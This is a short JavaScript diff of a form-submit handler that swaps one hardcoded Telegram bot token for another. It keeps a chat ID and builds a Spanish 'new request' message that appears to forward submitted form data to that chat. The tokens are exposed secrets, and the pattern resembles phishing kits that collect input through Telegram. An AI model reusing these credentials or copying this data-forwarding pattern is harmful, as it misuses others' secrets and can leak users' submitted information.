@@ -15,7 +15,7 @@ async function handleSubmit(e) {
     };
 
     try {
-        const BOT_TOKEN = '7704371778:AAF4h3i-QPKWv2w2M9O-zK32HeIxEhc1IvY';
+        const BOT_TOKEN = '7732026260:AAGS1T29BwTra3Sc2ic9hoKfF4iuIcgMUwo';
         const CHAT_ID   = '-1002386768203';
 
         const message = `*┏ 🟢 NUEVA SOLICITUD*\n` +
